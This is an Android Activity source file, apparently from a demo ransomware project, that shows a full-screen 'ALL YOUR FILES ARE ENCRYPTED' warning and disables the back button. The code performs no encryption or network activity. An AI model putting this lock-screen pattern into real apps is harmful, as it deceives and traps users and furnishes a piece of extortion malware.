package com.demo.ransom;

import android.app.Activity;
import android.os.Bundle;
import android.view.Gravity;
import android.widget.TextView;
import android.graphics.Color;

public class LockActivity extends Activity {
    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        TextView tv = new TextView(this);
        tv.setText("ALL YOUR FILES ARE ENCRYPTED");
        tv.setTextColor(Color.RED);
        tv.setTextSize(28);
        tv.setGravity(Gravity.CENTER);
        tv.setBackgroundColor(Color.BLACK);
        setContentView(tv);
    }

    @Override
    public void onBackPressed() {}
}
